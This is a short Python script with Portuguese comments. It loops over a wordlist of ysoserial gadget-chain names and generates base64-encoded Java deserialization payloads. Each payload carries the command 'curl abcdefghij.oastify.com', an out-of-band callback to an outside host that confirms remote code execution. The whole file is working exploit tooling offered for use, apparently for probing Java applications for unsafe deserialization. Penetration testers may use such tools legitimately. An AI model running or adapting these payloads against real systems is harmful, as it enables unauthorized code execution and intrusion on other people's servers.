import subprocess

# Nome do arquivo contendo a lista de palavras
wordlist_file = "wordlist.txt"

# Comando base
base_command = "java -jar ysoserial-all.jar {} 'curl abcdefghij.oastify.com' | base64 -w0"

# Ler a lista de palavras do arquivo
try:
    with open(wordlist_file, "r") as file:
        collections = [line.strip() for line in file.readlines() if line.strip()]
except FileNotFoundError:
    print(f"Erro: Arquivo '{wordlist_file}' não encontrado.")
    exit(1)

# Loop sobre as palavras
for collection in collections:
    command = base_command.format(collection)
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        payload = result.stdout.strip()
        print(f"{payload}\n")
    except Exception as e:
        print(f"Erro ao executar comando para {collection}: {e}")
